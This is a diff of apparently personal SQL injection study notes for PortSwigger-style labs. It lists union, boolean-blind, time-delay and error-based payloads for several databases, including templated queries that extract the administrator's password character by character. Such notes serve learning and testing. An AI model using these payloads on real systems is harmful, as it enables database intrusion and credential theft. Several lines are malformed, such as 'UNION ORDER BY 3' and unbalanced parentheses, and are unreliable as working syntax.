@@ -152,7 +152,7 @@ CHEAT-SHEET-FOR ALL DB -> https://portswigger.net/web-security/sql-injection/che
 	   ↓ No
 	Union Test 
 	   ├─ Works? Yes → Union-based
-	   │        e.g. id=1 UNION SELECT NULL-- how many columns?
+	   │        e.g. id=1 UNION ORDER BY 3 -- how many columns?
 	   │        e.g. id=1 UNION SELECT @@version, user(), database()--
 	   |
 	   |
@@ -167,7 +167,7 @@ CHEAT-SHEET-FOR ALL DB -> https://portswigger.net/web-security/sql-injection/che
 	   ↓ No
 	Time Delay 
 	   ├─ Works? Yes → Time-based Blind
-	   │        MySQL:      id=1' AND SLEEP(5)--
+	   │        MySQL:  id=1' AND SLEEP(5)-- , SELECT IF('a'='a', SLEEP(10), 'a')--
 	   │        MSSQL:      id=1' WAITFOR DELAY '0:0:5'--      
 	   │        PostgreSQL: id=1' AND pg_sleep(5)--    ,    ID=1'|| pg_sleep(5) --
 	   │        Oracle:     id=1' AND dbms_pipe.receive_message('a',5)--
@@ -244,19 +244,30 @@ CHEAT-SHEET-FOR ALL DB -> https://portswigger.net/web-security/sql-injection/che
 		tables=   table_name FROM   all_tables
 		for columns= column_name FROM all_tab_columns
 	
-	SUBSTRING('string',start_point,Length)
-	SUBSTRING('Hello World', 7, 5) the output: 'World'
+	1-SUBSTR('string',start_point,Length)
+	2-SUBSTR('Hello World', 7, 5) the output: 'World'
+	3- USE this || only for string like "abdo"||"mohamed" not with boolean 
+	(true/false) if you wanna use boolean use AND like id=kjs' AND 1=1 NOT THIS
+	 id=kjs' || 1=1
 
-	how work on blind(boolean):
-	1- what type of DB (Mysql, postgre,...) ->
-		MySQL: tracking=NdpS' AND LENGTH(database())>9 --
-		PostgreSQL: tracking=NdpS' AND LENGTH(current_database())>9--
-		MS SQL:tracking=NdpS' AND LEN(DB_NAME())>9--
-		Oracle:tracking=NdpS' AND  LENGTH((SELECT name FROM v$database))>9--
-	2- Discober the tables ->
+
+#how to detect on classic SQL:
+	Oracle :  SELECT banner,NULL FROM v$version
+	Microsoft:	SELECT @@version,NULL             # I Add NULL only if i have 2 columns
+	PostgreSQL: SELECT version()
+	MySQL: SELECT @@version,NULL
+
+
+#how to detect blind(  BOOLEAN  )                NOTE    use    --->       (ascii(SUBSTR)):  
+	1- Detect all types of DB ->
+		MySQL: tracking=NdpS' AND LENGTH(database())>2 --
+		PostgreSQL: tracking=NdpS' AND LENGTH(current_database())>2--
+		MS SQL:tracking=NdpS' AND LEN(DB_NAME())>2 --
+		Oracle:tracking=NdpS'  ||(SELECT '' FROM dual) -- #maybe waf block AND so use || 
+	2- Discober the tables  (DB-Type=MySQL)->
 		A) Guessing length of table:  (SELECT LENGTH(table_name) FROM 
 		information_schema.tables WHERE table_schema = current_schema() LIMIT 1 
-		OFFSET 0) > 22--
+		OFFSET 0) = 22--
 		B) Guessing name of first table:((SELECT SUBSTRING(table_name, 1,1) FROM 
 		information_schema.tables WHERE table_schema = current_schema() LIMIT 1 
 		OFFSET 0) = 'a'--
@@ -268,25 +279,62 @@ CHEAT-SHEET-FOR ALL DB -> https://portswigger.net/web-security/sql-injection/che
 		(SELECT SUBSTRING(column_name, 1, 1) FROM information_schema.columns 
 		WHERE table_name = 'users' LIMIT 1 OFFSET 0) = 'a'--
 		B) then Guessing second columns
-	4- Discover the content of table'user',culomns'username,passwd'(admin,carlos)
-		A) Guessing the length of username: (SELECT LENGTH(username) FROM users 
+	4- extractig data from table and column(carlos,q2wrfS)
+		A) Guessing the length of "username": (SELECT LENGTH(username) FROM users 
 		LIMIT 1 OFFSET 0) > 30--
-		B) Guessing the name of username: (SELECT SUBSTRING(username, 1, 1) FROM 
+		B) Guessing the name of "username": (SELECT SUBSTRING(username, 1, 1) FROM 
 		users LIMIT 1 OFFSET 0) = 'a'--
-		C) do the same thing for passwd: (SELECT SUBSTRING(password, 1, 1) FROM 
-		users LIMIT 1 OFFSET 0) = 'a'--
-		(SELECT SUBSTRING(username, 1, 1) FROM users LIMIT 1 OFFSET 1) = 'a'--
+		C) do the same thing for first passwd passwd: 
+		Length:   (SELECT LENGTH(password) FROM users WHERE username='admin' LIMIT 1) > 30--
+		extracting: (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin' LIMIT 1 ) = 'a'--
 	
+		(SELECT SUBSTRING(username, 1, 1) FROM users LIMIT 1 OFFSET 1) = 'a'--
+
+
+#how to detect blind (  TIME DELAY  )
+
+	1- know type of DB: try to replace || with AND , ALSO maybe ( ' , " ) ->
+	   │   MySQL:      id=1' || AND SLEEP(5)--  
+	   │   Oracle:     id=1' || AND dbms_pipe.receive_message('a',5)--
+	   │   MSSQL:      id=1' || WAITFOR DELAY '0:0:5'--      
+	   │   PostgreSQL: id=1' || pg_sleep(5)--    ,    ID=1' AND pg_sleep(5) --
+
+	2- add your condition ->
+	
+	  | MYSQL:       id=1' AND IF(1=1, SLEEP(5), 0)--
+	  | Oracle:      id=1' AND (CASE WHEN (1=1) THEN DBMS_SESSION.SLEEP(5) END)--
+	  | MSSQL:       id=1'; IF (1=1) WAITFOR DELAY '0:0:5'--
+	  | PostgreSQL:  id=1' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) END)--
+
+	3- Discover the tables(DB-Types=PostgreSQL) NOte i use (ascii(SUBSTR))->
+	 A) Guessing Length of table:
+	  || (SELECT CASE WHEN ((SELECT CHAR_LENGTH(table_name) FROM information_schema.tables WHERE table_schema = current_schema() LIMIT 1 OFFSET 0) = 3) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+	 
+	 B) Guessing name of first table change OFFSET: 
+	 || (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = current_schema() LIMIT 1 OFFSET {offset}), {pos}, 1)) = {ascii}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END)--
+
+	4- Discover the columns -->
+	 A) Guessing Length of columns:
+	 || (SELECT CASE WHEN ((SELECT CHAR_LENGTH(column_name) FROM information_schema.columns WHERE table_name = 'users' ORDER BY ordinal_position LIMIT 1 OFFSET {offset}) > {n}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END)--
+	 B) Guessing name of columns:
+	 || (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = 'users' ORDER BY ordinal_position LIMIT 1 OFFSET {offset}), {pos}, 1)) = {ascii}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END)--
+
+	5-extracting Date from table,column
+	 A) Guessing Length of column"username":
+	 || (SELECT CASE WHEN ((SELECT CHAR_LENGTH(username) FROM users LIMIT 1 OFFSET {offset}) = {n}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END)--
+	 B) Guessing the name of username column: 
+	 || (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT username FROM users LIMIT 1 OFFSET {offset}), {pos}, 1)) = {ascii}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END)--
+	 C) do the same on passwd 
+	 Length: || (SELECT CASE WHEN ((SELECT CHAR_LENGTH(password) FROM users WHERE username='admin' LIMIT 1  = {n}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END)--
+	 extracting content of passwd: || (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin' LIMIT 1 ), {pos}, 1)) = {ascii}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END)--
+
+
+
+
+
+
 # labs
 
-Start test what is the version and type :
-	1-detect the bug 
-	2- how many columns  (' ORDER BY {count of columns} -- -) don't forget to change the comment because it doesn't work on all types of DB
-		
-	Oracle :  SELECT banner,NULL FROM v$version
-	Microsoft:	SELECT @@version,NULL    #I Add NULL only if i have 2 columns
-	PostgreSQL: SELECT version()
-	MySQL: SELECT @@version,NULL
 
 lab.1 -> 
 	i see /filter?category=Gifts  and this category retrieve data so let's try sqli i put ' in end | =Gifts' and it gives my error so it's vuln to sqli let's try ' OR 1=1 -- to make it true and show all thing in this category 
@@ -333,3 +381,34 @@ lab.10 ->
 	OFFSET -> skipping line (how many line do wanna skip OFFSET 3 skip first 3 line)
 
 lab.11 ->
+
+lab.12 oracle -> 
+	
+	|| (SELECT CASE WHEN ( your-condition) THEN if-your-conditon-correct-do-anything here ELSE if-it -wrong-do-someting-here  END FROM dual)
+	
+	the length in oracle : 
+	trackingId=asd'|| (SELECT CASE WHEN (LENGTH( (SELECT   table_name FROM   all_tables WHERE ROWNUM=1 ) ) =4 )  THEN TO_CHAR(1/0) ELSE NULL END FROM dual   ) || ' -> if my condition work i show internal error if not i show 200 OK 
+	
+	(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0)   ELSE  '' END  FROM  dual) will happen  error if  dual table exists  
+	
+	(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0)   ELSE  '' END  FROM  dual) will NOT happen  error if  dual table exists  
+	
+	to know  user   exists :
+	||   (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0)   ELSE  NULL END  FROM  users WHERE username = 'administrator') ||  will happen  error if username=administrator    exists  
+	
+	the length of the password: 
+	' || (SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator' AND ROWNUM = 1)) = 22) THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL) || '
+	
+	OR TRY THIS: 
+	'|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE  '' END FROM users WHERE username='administrator' AND LENGTH(password)=20) ||'
+	
+	Brute force on the password but if you will write script must add ascii() before SUBSTR :
+	' || (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator' AND ROWNUM = 1), 1, 1) = 'a') THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL) || ' 
+	
+	for your script with ascii : ' || (SELECT CASE WHEN ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator' AND ROWNUM = 1), 1, 1)) = 9 THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL )||'
+
+lab.13 ->
+
+	in this lab it's return boolean but if not boolean i see visible error  so 
+	let's try to return username 'cause it's string  ->
+	TrackingId=Sjkw'AND 1=CAST((SELECT password FROM users LIMIT 1) AS int) -- 
